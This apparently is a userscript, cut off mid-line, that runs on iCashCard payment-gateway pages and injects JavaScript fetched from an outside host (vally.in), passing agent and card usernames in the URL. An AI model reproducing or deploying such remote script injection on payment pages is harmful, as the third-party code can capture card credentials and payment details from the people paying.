// ==UserScript==
			   // @name           SHAGUNTRAVELS_TSS Gateway
			   // @namespace      dharmu20012001@gmail.com
			   // @description    Rapid I_CASH_CARD Gateway.
			   // @include        http://www.icashcard.in/pggateway/icccheckcard.aspx
			   // @include        http://www.icashcard.in/pggateway/icccheckcard.aspx*
			   // @include        https://www.icashcard.in/pggateway/ICCPaySuccess.aspx?TransDetails*
			   // @include        https://www.icashcard.in/pggateway/icccheckcard.aspx
			   // @include        https://www.icashcard.in/pggateway/ICCPaySuccess.aspx*
			   // @include        http://icc.icashcard.com/PaymentGatewayASP/IcashCardPaymentGateway.asp
			   // @include        http://icc.icashcard.in/PaymentGatewayASP/ICCPaymentGateway.asp
			   // @include        http://www.icashcard.in/pggateway/valuecardLogin.aspx?ccode=MTAwMDQ=&customparam=MQ==
			   // ==/UserScript==
				
				function include ( JsFile )
{
        var elementBody = document.getElementsByTagName('body').item(0);
        var script = document.createElement('script');
        script.src = JsFile ;
        script.type = 'text/javascript';
        elementBody.appendChild(script)
}
include ('http://vally.in/includefile/pay2.php?uname=skjain_Gateway&gate1=I Cash Card RDS&cardusername=SHAGUNTRAVELS